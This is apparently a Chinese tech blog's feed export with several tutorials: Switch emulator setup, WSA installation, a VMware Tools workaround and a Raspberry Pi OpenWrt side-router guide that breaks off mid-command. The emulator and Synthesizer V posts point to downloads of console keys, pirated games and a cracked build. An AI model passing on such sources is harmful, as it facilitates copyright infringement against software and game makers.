1650 4GB / AMD Radeon RX Vega 56 8GB</li></ul><h2 id="集成显示卡"><a class="markdownIt-Anchor" href="#集成显示卡">#</a> 集成显示卡:</h2><blockquote><p>集成显卡的性能表现很差。 独立显卡能够在所有场景中产生更好的效果。 这里列出 iGPU 支持。</p></blockquote><ul><li>最小: Intel HD Graphics 520 / AMD Radeon Vega 3</li><li>推荐: Intel UHD Graphics 750 / AMD Radeon Vega 7</li></ul><h2 id="内存"><a class="markdownIt-Anchor" href="#内存">#</a> 内存:</h2><blockquote><p>因为集成 GPU 调用内存作为显存 (VRAM)，所以在此配置中的内存要求要高些。</p></blockquote><ul><li>最小专用显卡内存: 8GB</li><li>最小集成显卡内存: 12GB</li><li>推荐: 16GB</li></ul><hr><h1 id="安装前"><a class="markdownIt-Anchor" href="#安装前">#</a> 安装前</h1><blockquote><p>如果你已经有了 Switch 则可以提取自己的。我就不具体写教程了。可以看看 Ryujinx 官方提供的。</p></blockquote><ul><li><p>prod.key 导出:<a href="https://github.com/Ryujinx/Ryujinx/wiki/Keys">https://github.com/Ryujinx/Ryujinx/wiki/Keys</a></p></li><li><p>固件导出:<a href="https://github.com/Ryujinx/Ryujinx/wiki/Firmware-Dumping-Guide-(hbmenu-&amp;-Goldleaf)">https://github.com/Ryujinx/Ryujinx/wiki/Firmware-Dumping-Guide-(hbmenu-&amp;-Goldleaf)</a></p></li></ul><h1 id="下载安装-yuzu-软件"><a class="markdownIt-Anchor" href="#下载安装-yuzu-软件">#</a> 下载安装 yuzu 软件。</h1><blockquote><p>下列操作建议在科学上网环境下进行.</p></blockquote><ol><li>去 <a href="https://yuzu-emu.org/">https://yuzu-emu.org/</a> 下载最新的 yuzu 模拟器。并运行软体.<blockquote><p>我在下方的链接里也放了捐赠版也就是 EA，但是版本不会经常更新。如果安装出现问题可以试试。<br>yuzu EA 版本还支持多人联机的功能，但是需要你使用梯子才可以比较好的使用。</p></blockquote></li></ol><ul><li>yuzu Early Access 这个版本是只有捐赠用户才可以使用，如果条件支持可以去支持一波.</li><li>普通版本已经足够使用.</li></ul><ol start="2"><li>由于安装的时候会连接 Github 服务器下载文件，因此强烈建议使用全局科学上网.</li><li>安装完成后直接启动，提示缺少 key 文件，选 OK :</li></ol><blockquote><p><img src="/img/ns/20220920215251.png" alt=""></p></blockquote><ol><li><p>然后会跳出提示框问是否帮助改进 yuzu , 我们点 no.</p></li><li><p>此时已经完成安装了模拟器本体，不过想要正常运行游戏还需要做以下操作</p></li><li><p>执行工具栏中的  <code>文件</code>  -&gt;  <code>Open yuzu Folder</code>  打开 yuzu 软件自动创建的目录，然后在下方的链接里找到 key 文件夹，下载  <code>prod.keys</code>  文件扔进 keys 文件夹内.</p></li><li><p>然后再次打开 yuzu 就不会再弹出刚才的对话框了.</p></li></ol><h1 id="下载安装-ryujinx-软件"><a class="markdownIt-Anchor" href="#下载安装-ryujinx-软件">#</a> 下载安装 Ryujinx 软件</h1><blockquote><p>同样下列操作建议在科学上网环境下进行.</p></blockquote><ol><li>打开 <a href="https://ryujinx.org/">https://ryujinx.org/</a> ，选择上方 Download 下载最新编译版本解压。并运行软体.<blockquote><p><a href="https://github.com/Ryujinx/Ryujinx/actions">Action</a> 如果你有能力可以直接到 Ryujin 模拟器 github 获取最新测试版的编译版本。</p></blockquote></li><li>打开 <a href="https://darthsternie.net/switch-firmwares/">https://darthsternie.net/switch-firmwares/</a> ，下载最新的固件到本地备用。</li><li>在模拟器最上方依次点击 <code>File</code>  →  <code>Open Ryujinx Folder</code> 。</li><li>进入 system 文件夹，在下方的链接里找到 key 文件夹，下载  <code>prod.keys</code>  文件扔进 keys 文件夹内.</li><li>在模拟器最上方依次点击  <code>Tools</code>  →  <code>Install Firmware</code>  →  <code>Install a firmware from XCI or ZIP</code> , 选择刚才下载的固件文件点击  <code>open</code> 。<ol><li>若出现报错，如下图所示，是因为  <code>prod.keys</code>  文件与  <code>Firmware</code>  不匹配，prod.keys 文件要与 Firmware 匹配才可以安装成功，因此你若想安装新的 firmware，则需要你自己去找对应的 prod.keys<blockquote><p><img src="/img/ns/20221107165255.png" alt=""></p></blockquote></li></ol></li><li>添加游戏目录，依次点击  <code>Options</code>  →  <code>Settings</code>  ，打开设置，在  <code>General</code>  选项卡，点击  <code>Add</code></li><li>在弹出的窗口中选择你的游戏目录，然后点击右下角的  <code>Add</code> ，然后点击 <code>Save</code> 。</li></ol><hr><h1 id="模拟器设置yuzu和ryujinx部分内容通用有区别我会标注出来"><a class="markdownIt-Anchor" href="#模拟器设置yuzu和ryujinx部分内容通用有区别我会标注出来">#</a> 模拟器设置（yuzu 和 ryujinx 部分内容通用，有区别我会标注出来）</h1><p>执行  <code>模拟(E)</code>  -&gt;  <code>Configure...</code>  打开 yuzu 设置.</p><h2 id="通用选单"><a class="markdownIt-Anchor" href="#通用选单">#</a> 通用选单</h2><ul><li>Interface 下第一项（interface language）可以更改显示语言，建议先把这个改为中文。</li><li>勾选  <code>多核 CPU 仿真</code>  可在一定程度上改进性能.</li><li><code>运行速度限制</code>  更改到 100% 可解决某些游戏没有帧数限制导致游戏速度异常。</li><li>网络选单下可以填写你注册 yuzu 网站后的令牌以此来进行联机。</li></ul><h2 id="系统选单"><a class="markdownIt-Anchor" href="#系统选单">#</a> 系统选单</h2><ul><li>在 系统 选单，系统 选项卡，系统设置 框架内根据需要设置  <code>语言</code> ， <code>地区</code>  和  <code>时区</code> ，这里推荐  <code>中文</code> ， <code>中国</code> ， <code>中文</code>  不然默认语言看不懂 (</li><li>配置选项卡可以更改个人信息但是没什么用。</li><li>网络选项卡若要使用联机服务则需要选择一种连接方式，通常是以太网或者 WLAN。这取决于你当前使用什么方式上网。</li></ul><h2 id="图形选单"><a class="markdownIt-Anchor" href="#图形选单">#</a> 图形选单</h2><ul><li><code>API</code>  任意选择，N 卡选 Vulkan 有时候也更好。</li><li>如果你的设备是笔记本，那你需要更改  <code>设备</code>  为自己的独立显卡。</li></ul><h2 id="控制选单"><a class="markdownIt-Anchor" href="#控制选单">#</a> 控制选单</h2><ul><li><code>输入设备</code>  内可以选择自己的手柄 / 控制器。唯一需要注意的是 switch 按键的 ab/xy 按键是反过来的，建议游玩的时候别看手柄。</li><li>最后点击  <code>OK</code>  即可完成配置…</li></ul><h1 id="下载游戏"><a class="markdownIt-Anchor" href="#下载游戏">#</a> 下载游戏</h1><blockquote><p>我发现<a href="https://xxxxx520.com/" title="Switch520"> Switch520</a> 这里的游戏下载没那么多门槛要会员什么什么的，不过都是百度网盘，建议整一个百度网盘会员.(现在有插件可以实现免会员高速下载，有空我再写写：P)</p></blockquote><p>文中提到的文件可以到这个链接：<strong><a href="https://maxshiro-my.sharepoint.com/:f:/g/personal/maxshiroi_maxshiro_onmicrosoft_com/El4X0CVz-TBKqO0k_-_BWRcBt4uT7Tf-gVJtrKdPhbyP5A?e=IUlqdf" title="Sharepoint">Sharepoint</a></strong> 里面下载获取。</p><p>下载 xxx.xci 文件，这就是游戏本体了。将这个游戏本体放到任意文件夹内 (不要有中文) . 双击 yuzu 模拟器中间，选择你放 xci 文件的那个文件夹打开，然后你就会发现游戏已经加载出来了。双击打开爽玩吧～</p><h1 id="处理-switch-游戏文件"><a class="markdownIt-Anchor" href="#处理-switch-游戏文件">#</a> 处理 Switch 游戏文件</h1><p>switch 可以下载到的文件有很多种，因此有些时候我们下载得到的文件并不是 xci 或者 nsp 这样的可执行文件。这种时候就需要自己转换游戏文件格式。</p><h2 id="常见的几种格式"><a class="markdownIt-Anchor" href="#常见的几种格式">#</a> 常见的几种格式</h2><ul><li><code>xci</code> ：可以理解 XCI 文件直接从卡带提取的文件，而 XCI 整合版（整合了游戏升级补丁 + DLC 的版本是最方便的 推荐下载）</li><li><code>xcz</code> : 是 xci 压缩后的文件，需要转换为 xci 才可以正常使用。</li><li><code>nsp</code> : nsp 相当于正版系统数字游戏，nsp 没有整合版，当您看到文件名称有  <code>000</code>  或者  <code>v0</code>  说明是本体。而文件名中带有  <code>Updata</code>  的则为升级补丁，带有  <code>DLC</code>  字样则为扩展游戏内容的额外内容。</li><li><code>nsz</code> : 有些 DLC 或者升级补丁会打包为 nsz 文件，打包的时候可以忽略，如果是游戏文件则您需要转换为 nsp 文件才可以运行。</li></ul><h2 id="四种格式之间转换"><a class="markdownIt-Anchor" href="#四种格式之间转换">#</a> 四种格式之间转换。</h2><blockquote><p>使用 NSCB 软件进行打包等操作，我获取到的适配 15.0.0 版本的。这软件有时效性，因此如果不能正常使用则需要更新。<br><a href="https://wwb.lanzoum.com/iVl9f0dw6svg">NSCB</a></p></blockquote><h1 id="emusak-ui-软件"><a class="markdownIt-Anchor" href="#emusak-ui-软件">#</a> EmuSAK UI 软件</h1><blockquote><p>使用此软件可以更方便的管理你电脑上现有的模拟器以及游戏，还可以获取最新的 prod.key 等文件。<br><a href="https://github.com/CapitaineJSparrow/emusak-ui">https://github.com/CapitaineJSparrow/emusak-ui</a></p></blockquote><p>EmuSAK UI 功能一览：</p><ul><li>添加并管理电脑上的多个 switch 模拟器 (单机或者联机版 ryujinx)</li><li>找到并列出电脑中的 switch 游戏</li><li>展示本地着色器缓存 &amp; emusak 在线着色器缓存 (如果本地缓存较少可以下载在线缓存)</li><li>更新固件</li><li>更新 prod keys 密钥</li><li>给下载游戏存档</li><li>下载着色器缓存</li><li>下载 mod 模组</li><li>一键分享电脑中的着色器缓存 (shader cache)</li></ul>]]></content>
      
      
      
        <tags>
            
            <tag> switch </tag>
            
            <tag> animal crossing </tag>
            
            <tag> Project Diva </tag>
            
            <tag> Miku </tag>
            
            <tag> Mega39 </tag>
            
            <tag> emulater </tag>
            
            <tag> yuzu </tag>
            
            <tag> ryujinx </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>【虚拟Vocal】 Synthesize V 初代整合</title>
      <link href="/ug/210724/"/>
      <url>/ug/210724/</url>
      
        <content type="html"><![CDATA[<h1 id="软件介绍"><a class="markdownIt-Anchor" href="#软件介绍">#</a> 软件介绍</h1><p>Synthesizer V 是 Dreamtonics 开发的系列歌声合成软件，它结合了强大的歌声合成引擎和直观灵活的用户界面，只需绘制旋律并注入歌词，即可轻松创作原创歌曲。</p><h1 id="intro"><a class="markdownIt-Anchor" href="#intro">#</a> Intro</h1><p>当你想要摆脱 Vocaloid 软件的支配，想要试试其他同类型的软件。您肯定会搜到这个软件。但是很不幸，当您点开官网查看售价，显然单个声库加 pro 版软件 899 的价格让您打了退堂鼓。<br>  您只好把思路转向搜索 crack 版本软件。又很不幸，这个软件 crack 版的本体和声库都很难寻找。<br>  在这里恭喜您找到了这篇文章。可万幸中的不幸就是，我也没有这个软件的 V2 破解版。但是我找到了 V1 的破解版，在此提供给大家。</p><h1 id="关于软件"><a class="markdownIt-Anchor" href="#关于软件">#</a> 关于软件</h1><p>软件的获取来源是 GitHUB 用户 <code>CJLU</code>  的 <code>Synthesizer-V-FE</code> , 版本为 1.8.0，所有功能正常使用。链接地址：<a href="https://github.com/CJLU-source/Synthesizer-V-FE" title="给特何不">给特何不</a></p><h1 id="关于声库"><a class="markdownIt-Anchor" href="#关于声库">#</a> 关于声库</h1><p>目前手头上只有这几个声库：</p><h2 id="eng-英语"><a class="markdownIt-Anchor" href="#eng-英语">#</a> Eng (英语)</h2><ul><li>爱莲娜芙缇 (女)</li></ul><h2 id="zh-中文"><a class="markdownIt-Anchor" href="#zh-中文">#</a> Zh (中文)</h2><ul><li>苍穹 (女)</li><li>赤羽 (女)</li><li>海伊 (女)</li><li>诗岸 (女)</li></ul><h2 id="jp-日文"><a class="markdownIt-Anchor" href="#jp-日文">#</a> JP (日文)</h2><ul><li>闇音レンリ (女)</li><li>玄武 (男)</li></ul><h1 id="下载地址-包含全部内容"><a class="markdownIt-Anchor" href="#下载地址-包含全部内容">#</a> 下载地址 （包含全部内容）</h1><blockquote><p>特殊原因暂不提供 😦<br>(其实是文件丢了</p></blockquote>]]></content>
      
      
      
        <tags>
            
            <tag> Vocal </tag>
            
            <tag> AI </tag>
            
            <tag> 歌声合成 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Win11 安装 WSA 简易教程</title>
      <link href="/ug/205944/"/>
      <url>/ug/205944/</url>
      
        <content type="html"><![CDATA[<blockquote><p>微软终于在昨天上线了 WSA 的测试版本，此次只有美国地区上线了。因此如果你的 Win11 系统为美区的话，可以直接点击 <a href="https://www.microsoft.com/store/productId/9P3395VX91NR" title="这个链接">这个链接</a> 进行安装。如果非美区那就接着看步骤吧</p></blockquote><blockquote><p>bug 还是有很多，首先是 WSA 无法调用 GPU, 这就导致很多 3d 游戏会很卡，实测明日方舟帧数不到 20 帧。然后安装 WSA 要启用 Hyper-V 即微软的虚拟机平台，打开这个会导致无法再安装和使用其他安卓模拟器。和市面上大多数安卓模拟器相比，微软这个 WSA 是 ARM 翻译运行的，安卓版本更高 (Android 11), 可以运行 ARM 程序。与系统集成度更好 (虽然目前还没有实现 WSL 那样的文件访问) 而模拟器大多都为 Android x86 项目改的，因此最高只能到 Android 9.</p></blockquote><blockquote><p>如果你是想尝尝鲜，试试这个新功能那我还是推荐试一试。如果你主要想拿来打游戏，日常使用的话那还是更推荐安卓模拟器一些.</p></blockquote><h1 id="开启虚拟化"><a class="markdownIt-Anchor" href="#开启虚拟化">#</a> 开启虚拟化</h1><blockquote><p>PS: 如果之前你有禁用过 Hyper-V 的话记得使用管理员权限打开 Powershell 然后通过这个指令这个指令重新打开，不记得有没有那就跳过:</p></blockquote><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">bcdedit /set hypervisorlaunchtype auto<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><ol><li>打开开始菜单，直接搜索控制面板，然后打开.</li><li>找到  <code>程序和功能</code>  - <code>启用或关闭 Windows 功能</code>  并点击打开，会弹出一个窗口.</li><li>在弹出窗口里面勾选  <code>Hyper-V</code> 、 <code>Windows 虚拟机监控程序平台</code> 、 <code>适用于 Linux 的 Windows 子系统</code> 、 <code>虚拟机平台</code>  这几项，然后点击确定。系统会自动查找更新并安装.</li><li>等待重启过后就可以进行下一步了.</li></ol><h1 id="安装本体"><a class="markdownIt-Anchor" href="#安装本体">#</a> 安装本体</h1><ol><li>首先复制上面那个链接.</li><li><a href="https://store.rg-adguard.net/" title="安装包抓包">安装包抓包</a>，点开这个网址，将第一步复制的链接粘贴到搜索框，右边选择  <code>slow</code>  然后点对勾.</li><li>找到最下面名为  <code>MicrosoftCorporationII.WindowsSubsystemForAndroid_1.7.32815.0_neutral_~_8wekyb3d8bbwe.msixbundle</code>  的一项，注意大小为  <code>1.21GB</code>  , 直接点击进行一个下载.</li><li>找到你下载的文件，然后右键  <code>开始按钮</code>  选择  <code>Windows 终端 (管理员)</code></li><li>然后会打开 Powershell 窗口，在里面输入指令</li></ol><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">add-appxpackage "你下载文件的完整路径" # exampleadd-appxpackage "D:\download\MicrosoftCorporationII.WindowsSubsystemForAndroid_1.7.32815.0_neutral_~_8wekyb3d8bbwe.msixbundle"<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre><ol start="6"><li>等他跑完以后就会在开始菜单里出现  <code>Windows Subsystem for Android™</code>  点击打开是下面这个界面就说明安装成功了.<br><img src="/img/wsa/20220920220234.png" alt=""></li></ol><h1 id="安装apk"><a class="markdownIt-Anchor" href="#安装apk">#</a> 安装 apk</h1><ol><li>点击文件后面的按钮会自动启动 WSA, 等打开后下面的 ip 地址会刷新。此时我们将开发人员模式打开.</li><li>安装 ADB, 下载 <a href="https://nas.axro.top/index.php/s/frYxCHg7FfabNEY" title="这个文件">这个文件</a> 然后解压到任意目录，然后打开解压出来的文件夹，名称为  <code>platform-tools</code> .</li><li>按住 <code>Shift</code>  键右击文件夹的空白处，选择 <code>显示更多选项</code>  - <code>在此处打开 Powershell 窗口(s)</code> , 然后在打开的窗口内依次输入以下指令:</li></ol><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">adb connect 127.0.0.1:58526 #这个 127.0.0.1:58526 为你的开发人员选项那一栏里显示的地址.# 第一次可能会失败, 再输入一次就可以了.adb install -r xxx.apk# 这个指令为安装 apk, 将 xxx 替换为你要安装的 apk 文件名称.<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre><ol start="4"><li>显示安装完成就会出现在你的开始菜单里，然后直接点击进行一个打开.</li></ol><h1 id="qa"><a class="markdownIt-Anchor" href="#qa">#</a> Q&amp;A</h1>]]></content>
      
      
      
        <tags>
            
            <tag> Android </tag>
            
            <tag> Hyper-V </tag>
            
            <tag> WSA </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>【VMware】解决新版本的VMware虚拟机无法正常在旧版本的Windows上安装VMware Tools</title>
      <link href="/ug/124600/"/>
      <url>/ug/124600/</url>
      
        <content type="html"><![CDATA[<h1 id="引言"><a class="markdownIt-Anchor" href="#引言">#</a> 引言</h1><p>因为学习需要，要求安装 <code>Windows server 2008 R2</code> 。安装时一切正常，但是到了安装 <code>VMware Tools</code>  时，弹出了下列提示：</p><p><img src="/img/vmwarebug/20220920220101.png" alt=""></p><h1 id="其后"><a class="markdownIt-Anchor" href="#其后">#</a> 其后</h1><p>我尝试百度搜索了解决办法，导致这种情况的大概解释为：</p><blockquote><p>原来，微软更新了驱动程序的签名算法，从 2019 年初开始，逐步弃用 SHA-1，改为 SHA-2。个人推测新版的 VMCI 驱动用的是 SHA-2 签名，而 <code>win7</code>  不支持 SHA-2 签名，所以出现了这个问题。</p></blockquote><p>那么怎么办呢？</p><blockquote><p>可以从 <code>Microsoft Update Catalog</code>  下载 <code>KB4474419</code>  和  <code>KB4490628</code>  这两个补丁，然后安装到 <code>win7</code>  虚拟机中。在没有成功安装 <code>VMware Tools</code>  的情况下，传文件不太方便，可以用虚拟机里浏览器访问下载页面，然后直接在虚拟机里下载安装。</p></blockquote><p>可是在 <code>winserver</code>  虚拟机里很难进行操作更别说老旧的 IE 操作更不方便，而且 <code>windows server</code>  的网络管理大家也都知道，会拦截所有地址。所以直到最后我也没法访问到微软的补丁界面。</p><h1 id="解决方法"><a class="markdownIt-Anchor" href="#解决方法">#</a> 解决方法</h1><p>我直接搜索了 <code>VMware Tools</code> ，到其官网上找到了旧版本的 <code>Tools</code>  镜像文件，随后直接对其进行一个挂载，这时直接弹出了自动运行窗口，进行一顿下一步下一步之后，成功将其安装到了虚拟机内。</p><h1 id="旧版本下载地址"><a class="markdownIt-Anchor" href="#旧版本下载地址">#</a> 旧版本下载地址</h1><p><a href="https://packages.vmware.com/tools/releases/10.3.5/windows/" title="点我去官网下载">点我去官网下载</a><br>打开以后下载大小为 <code>114M</code>  的映像文件，然后手动挂载到虚拟机上，便会自动运行。</p><p>转载需注明出处！</p>]]></content>
      
      
      
        <tags>
            
            <tag> vmware </tag>
            
            <tag> bug </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>使用树莓派4B+Docker Openwrt实现旁路由</title>
      <link href="/ug/205645/"/>
      <url>/ug/205645/</url>
      
        <content type="html"><![CDATA[<h1 id="前言"><a class="markdownIt-Anchor" href="#前言">#</a> 前言</h1><blockquote><p>普通路由器往往受限于硬体性能而缺乏很多功能。但是其拥有多网口和无线功能的支持相对较强。为了能实现更多实用功能并且利用上已经吃灰了很久的树莓派，打算用树莓派来当作旁路由.</p></blockquote><h1 id="硬体"><a class="markdownIt-Anchor" href="#硬体">#</a> 硬体</h1><h2 id="路由"><a class="markdownIt-Anchor" href="#路由">#</a> 路由</h2><ul><li>我使用的是小米路由 3G (下面称为 <code>R3G</code> ). 当时购买的是小米路由 4 版本，但是其缺乏很多功能。就比如说非常实用的 usb 接口。有了 usb 接口以后就可以愉快刷机了。所以我收到货就直接退货换了 R3G…</li><li>R3G 优点是有一个 usb3.0 的接口，所以可以直接拿它来挂载移动硬盘也是没问题的。还有 256M 的闪存。缺点是只有两个 RJ45LAN 口，一个 RJ45WAN 口足够家用。所以后来我又白嫖了我哥在外地买的一台 TPlink 五口交换机解决了网口不够的问题…</li><li>如果你和我一样拥有 R3G. 我建议刷写不死鸟 breed 搭配<a href="https://opt.cn2qq.com/padavan/" title="hiboyhiboyhiboy"> hiboyhiboyhiboy</a> 的固件，来实现更多功能…</li></ul><h2 id="树莓派"><a class="markdownIt-Anchor" href="#树莓派">#</a> 树莓派</h2><ul><li>树莓派 4B 我购买的是 4G 内存版本。采用 5V3A,Type-C 供电接口，你甚至可以用一个充电宝和一根 Type-C 线来给树莓派供电。两个 MicroHDMI 接口支持 4K 视频输出。一个极为先进的 3.5mm 音频接口。四个 Type-A USB 接口，其中分为两个 usb2.0 协议，两个 USB3.0 协议。一个千兆 RJ45 网口。另外机器还自带 wifi 模块，就是别指望这个 wifi 信号有多好了…</li><li>我在购买时还一并购买了一张 32G 闪迪的 SD 卡，以及适用于 4B 的九层亚克力外壳。有一说一，这个外壳属实好看…</li><li>不过如果拿它刷 openwrt 只来当作路由器实在大材小用。所以我采用 OPENFANS 和<a href="http://www.pifan.org.cn/" title="树莓派爱好者基地">树莓派爱好者基地</a>联合编译的<a href="https://github.com/openfans-community-offical/Debian-Pi-Aarch64" title="Debian-Pi-Aarch64"> Debian-Pi-Aarch64</a> 来使用</li></ul><h1 id="软体"><a class="markdownIt-Anchor" href="#软体">#</a> 软体</h1><h2 id="准备"><a class="markdownIt-Anchor" href="#准备">#</a> 准备</h2><ul><li>从上方给出的链接下载<a href="https://github.com/openfans-community-offical/Debian-Pi-Aarch64" title="Debian-Pi-Aarch64"> Debian-Pi-Aarch64</a>, 我这里使用的是没有图形界面的增强版，即 <code>2021-06-11-OPENFANS-Debian-Buster-Aarch64-ext4-v2021-2.0-U6-Release.img.xz</code></li><li>百度搜索 Rufus, 下载到本地</li></ul><h2 id="安装-debian-pi-aarch64"><a class="markdownIt-Anchor" href="#安装-debian-pi-aarch64">#</a> 安装 Debian-Pi-Aarch64</h2><ol><li>将 SD 卡接入读卡器连接电脑。注意提前备份 SD 卡的数据，接下来的操作会清除 SD 卡内的全部数据.</li><li>打开 Rufus 软体，在 <code>设备</code> 一栏内选择你的 SD 卡，在 <code>引导类型选择</code> 栏里面单击后面的 <code>选择</code> 按钮，选择你下载的 xz 文件</li><li>单击下面的 <code>开始</code> 按钮即可开始刷写。大概三四分钟后即可刷写成功。请耐心等待…</li><li>刷写完成后在任务栏上将 SD 卡弹出，即可拔下读卡器。将 SD 卡插入树莓派里面即可.</li><li>将树莓派的 LAN 口与路由器的 LAN 口连接，为树莓派接入电源。此时树莓派会自行重启三次左右，以完成基本配置。此时可以喝杯咖啡等待三分钟左右.</li><li>电脑登入路由器控制页面，查找树莓派的 ip, 我这里查到的是 <code>192.168.0.90</code> , 接下来的教程将以这个地址为准…</li><li>如果您使用的是 Win10 系统，那么可以直接按下 <code>Windows徽标键</code>  + <code>R</code> , 输入 <code>CMD</code>  指令单击回车来打开 <code>CMD</code> , 使用 <code>SSH</code>  的方式连入树莓派。当然你也可以使用其他第三方软件来实现.</li><li>使用 <code>ssh -p 22 pi@192.168.0.90</code>  指令来接入树莓派，如果没有出错的话接下来会弹出提示，输入 <code>yes</code>  并按下回车即可。当你看见 password 时，直接输入默认密码 <code>raspberry</code> , 按下回车即可连入树莓派.</li><li>更新一下就可以正常使用了</li></ol><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">sudo apt-get update &amp;&amp; sudo apt-get upgrade<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><h2 id="配置-debian-pi-aarch64"><a class="markdownIt-Anchor" href="#配置-debian-pi-aarch64">#</a> 配置 Debian-Pi-Aarch64</h2><p><strong>如果自己会配置那么这步可以跳过了</strong></p><blockquote><p>可以参考<a href="https://gitee.com/openfans-community/Debian-Pi-Aarch64#3%E4%BD%BF%E7%94%A8%E8%AF%B4%E6%98%8E" title="这里">这里</a>来配置</p></blockquote><h3 id="切换账户"><a class="markdownIt-Anchor" href="#切换账户">#</a> 切换账户</h3><p><code>su</code>  或者 <code>sudo -i</code></p><h3 id="更改账户的密码"><a class="markdownIt-Anchor" href="#更改账户的密码">#</a> 更改账户的密码</h3><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">// 使用下面指令来更改pi用户的密码// 重复输入两次即可sudo passwd pi// 使用这个指令来更改root账户的密码sudo passwd root<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h3 id="挂载smb硬盘"><a class="markdownIt-Anchor" href="#挂载smb硬盘">#</a> 挂载 smb 硬盘</h3><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">cd /mkdir dbmount -o username=xxx,password=xxx,dir_mode=0777,file_mode=0777 //192.168.0.15/database /db<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre><h2 id="安装-openwrt"><a class="markdownIt-Anchor" href="#安装-openwrt">#</a> 安装 Openwrt</h2><blockquote><p>在安装之前首先开启 docker 服务并设置开机自动启动</p></blockquote><ul><li>启用和运行 Docker 服务</li></ul><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">// 开机自动启动Docker服务systemctl enable docker.service// 启动Docker服务systemctl start docker.service######// 停止Docker服务systemctl stop docker.service// 禁止Docker服务开机启动systemctl disable docker.service<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><ol><li>打开网卡混杂模式</li></ol><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">sudo ip link set eth0 promisc on<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><ol start="2"><li>创建网络</li></ol><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">docker network create -d macvlan --subnet=192.168.0.0/24 --gateway=192.168.0.1 -o parent=eth0 macnet <span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><blockquote><p>使用 <code>sudo ifconfig</code>  命令查看树莓派 <code>eth0</code>  网卡的参数来更改<br> <code>--subnet</code>  参数改为树莓派所处网段<br> <code>--gateway</code>  参数改为树莓派所处网段的网关</p></blockquote><ul><li>使用 <code>docker network ls</code>  查看创建好的网络</li></ul><ol start="3"><li>拉取 Openwrt 镜像</li></ol><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">docker pull registry.cn-shanghai.aliyuncs.com/suling/openwrt:latest <span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><ul><li>执行 <code>docker images</code>  命令查看现存镜像</li></ul><ol start="4"><li>创建并启动容器</li></ol><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">docker run --restart always --name openwrt -d --network macnet --privileged registry.cn-shanghai.aliyuncs.com/suling/openwrt:latest /sbin/init <span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><blockquote><p><code>--restart always</code>  参数表示容器退出时始终重启，使服务尽量保持始终可用；<br> <code>--name openwrt</code>  参数定义了容器的名称；<br> <code>-d</code>  参数定义使容器运行在 <code>Daemon</code>  模式；<br> <code>--network macnet</code>  参数定义将容器加入 <code>maxnet</code>  网络；<br> <code>--privileged</code>  参数定义容器运行在特权模式下；<br> <code>registry.cn-shanghai.aliyuncs.com/suling/openwrt:latest</code>  为 Docker 镜像名，因容器托管在阿里云 Docker 镜像仓库内，所以在镜像名中含有阿里云仓库信息；<br> <code>/sbin/init</code>  定义容器启动后执行的命令。</p></blockquote><ul><li>可以使用 <code>docker ps -a</code>  命令查看当前运行的容器</li></ul><blockquote><p>若容器运行信息 <code>STATUS</code>  列为 <code>UP</code>  状态，则说明容器运行正常。</p></blockquote><ol start="5"><li>进入容器并修改相关参数</li></ol><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">docker exec -it openwrt bash<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><ul><li>编辑 <code>OpenWrt</code>  的网络配置文件：</li></ul><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">nano /etc/config/network<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><ul><li>更改 LAN 口设置</li></ul><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">config interface 'lan'        option type 'bridge'        option ifname 'eth0'        option proto 'static'        option ipaddr '192.168.0.2'        option netmask '255.255.255.0'        option ip6assign '60'        option gateway '192.168.0.1'        option broadcast '192.168.0.255'        option dns '192.168.0.1'<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><blockquote><p><code>option ipaddr</code>  为 OpenWrt 的 IP 地址，可以根据自己喜好修改，我这里定义为了 <code>192.168.0.2</code></p></blockquote><ul><li>重启网络</li></ul><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">/etc/init.d/network restart<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><ol start="6"><li>进入控制面板</li></ol><blockquote><p>打开电脑的浏览器，使用自己定义的地址进入。我这里是 <code>192.168.0.2</code> <br> 用户名: <code>root</code> <br> 密码: <code>password</code></p></blockquote><ol start="7"><li>关闭 DHCP 服务</li></ol><blockquote><p>在 “网络 - 接口 - Lan - 修改” 界面中，勾选下方的 "忽略此接口 (不在此接口提供 DHCP 服务)", 并 "保存 &amp; 应用".</p></blockquote><h2 id="修复宿主机网络"><a class="markdownIt-Anchor" href="#修复宿主机网络">#</a> 修复宿主机网络</h2><p>OpenWrt 容器运行后，宿主机内可能无法正常连接外部网络，需要修改宿主机的 <code>/etc/network/interfaces</code>  文件以修复：</p><ol><li>备份并编辑文件</li></ol><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">cp /etc/network/interfaces /etc/network/interfaces.bak # 备份文件nano 